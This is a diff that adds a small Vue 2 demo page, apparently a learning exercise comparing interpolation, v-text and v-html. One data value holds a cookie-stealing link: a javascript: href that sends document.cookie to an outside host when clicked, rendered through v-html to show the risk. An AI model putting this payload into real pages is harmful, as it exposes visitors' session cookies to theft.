@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="../js/vue.js"></script>
+</head>
+
+<body>
+    <div id="root">
+        <h2>{{name}}</h2>
+        <h2 v-text="name"></h2>
+        <!-- FOund -->
+        <h2 v-html="str"></h2>
+        <!-- <h3>404</h3> -->
+        <h2 v-html="str2"></h2>
+    </div>
+    <script>
+        Vue.config.productionTip = false;
+        new Vue({
+            el: '#root',
+            data() {
+                return {
+                    name: 'FOund',
+                    str: '<h3>404</h3>',
+                    str2: '<a href=javaScript:location.href="http://www.baidu.com?"+document.cookie>点我跳转</a>',
+                }
+            },
+        })
+    </script>
+</body>
+
+</html>
